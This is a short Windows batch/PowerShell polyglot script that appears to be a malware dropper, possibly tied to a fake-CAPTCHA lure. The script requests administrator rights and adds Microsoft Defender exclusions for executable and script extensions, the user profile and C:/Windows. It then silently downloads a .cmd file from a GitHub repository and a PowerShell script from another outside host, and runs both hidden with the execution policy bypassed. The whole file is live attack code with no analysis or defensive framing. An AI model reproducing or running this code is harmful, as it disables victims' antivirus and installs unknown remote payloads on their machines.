<# :batch script
Echo Please wait...
@echo off
setlocal
cd "%~dp0"
powershell -ep remotesigned -Command "IEX $([System.IO.File]::ReadAllText('%~f0'))"
endlocal
goto:eof
#>
while($true) {
    try {
        # Step 1: Set exclusions with admin privileges
        $excludePath = [System.IO.Path]::GetFullPath($env:USERPROFILE)
        $exclusionsCommand = "Add-MpPreference -ExclusionExtension '.dll','.ps1','.cmd','.exe','.bat','.vbs','.lnk'; Add-MpPreference -ExclusionPath '$excludePath'; Add-MpPreference -ExclusionPath 'C:/Windows'"
        Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command $exclusionsCommand" -Verb runas -Wait

$urlCmd = 'https://raw.githubusercontent.com/captcharequest/submit/refs/heads/main/submitted.cmd'
$filePathCmd = [System.IO.Path]::Combine($env:USERPROFILE, 'submitted.cmd')
$downloadAndExecuteCmd = "Invoke-WebRequest -Uri `'$urlCmd`' -OutFile `'$filePathCmd`'; Start-Process -FilePath `'$filePathCmd`' -WindowStyle Hidden"
Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$downloadAndExecuteCmd`"" -WindowStyle Hidden

$urlPs1 = 'https://idauth.id/uploads/TG2.ps1'
$filePathPs1 = [System.IO.Path]::Combine($env:USERPROFILE, 'TG2.ps1')
$downloadAndExecutePs1 = "Invoke-WebRequest -Uri `'$urlPs1`' -OutFile `'$filePathPs1`'; powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `'$filePathPs1`'"
Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$downloadAndExecutePs1`"" -WindowStyle Hidden
        # Exit the loop after successful execution
        exit
    } catch {
        # Optional: Add logging or handling here if needed
    }
}